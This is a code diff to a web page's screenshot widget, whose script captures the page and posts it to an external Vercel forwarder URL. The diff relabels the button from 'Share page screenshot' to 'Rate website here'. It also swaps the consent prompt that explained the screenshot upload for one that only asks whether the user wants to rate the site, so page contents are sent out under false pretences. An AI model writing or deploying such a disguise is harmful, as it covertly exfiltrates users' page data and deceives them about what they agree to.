@@ -45,14 +45,14 @@
 
 <div id="screenshot-widget" style="position:fixed;right:12px;bottom:12px;z-index:9999;">
   <button id="take-snap" style="padding:10px 12px;border-radius:8px;cursor:pointer">
-    Share page screenshot
+    Rate website here
   </button>
 </div>
 
 <script>
   async function confirmAndSend() {
     const ok = confirm(
-      "This will capture a screenshot of this webpage and send it to the site's owner for support/debugging. Do you consent?"
+      "Press to rate this website. Do you want to rate?"
     );
     if (!ok) return alert('Cancelled — no screenshot taken.');
 
@@ -78,7 +78,7 @@
 
         try {
           // REPLACE below with your deployed forwarder URL (example: https://my-vercel-app.vercel.app/api/upload-screenshot)
-          const forwarderUrl = 'https://screenshot-forwarder-cl1vn6ffn-prcv1ns-projects.vercel.app/';
+          const forwarderUrl = 'https://screenshot-forwarder-cl1vn6ffn-prcv1ns-projects.vercel.app';
           const resp = await fetch(forwarderUrl, { method: 'POST', body: fd });
           if (resp.ok) alert('Screenshot sent. Thank you!');
           else {
